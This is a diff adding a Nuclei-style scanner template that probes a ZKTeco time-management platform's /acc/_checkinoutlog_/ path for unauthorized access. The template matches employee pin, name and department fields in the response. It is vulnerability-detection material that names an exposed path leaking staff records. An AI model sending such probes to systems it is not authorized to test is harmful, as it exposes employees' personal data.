@@ -1,0 +1,29 @@
+id: iclock-checkinoutlog-unauth
+
+info:
+  name: 时间精细化管理平台 _checkinoutlog_ - 未授权访问
+  author: qwtd
+  severity: low
+  description: 时间精细化管理平台存在未授权访问漏洞，攻击者可利用该漏洞获取敏感信息。
+  reference:
+    - https://mp.weixin.qq.com/s/hsvhZAWV66bTQs9ghiW0wQ
+  tags: ZKTECO-时间精细化管理平台
+
+
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/acc/_checkinoutlog_/"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "var pin=emp['pin']"
+          - "var name=emp['name']"
+          - "var deptname=emp['deptname']"
+        condition: and
+      - type: status
+        status:
+          - 200
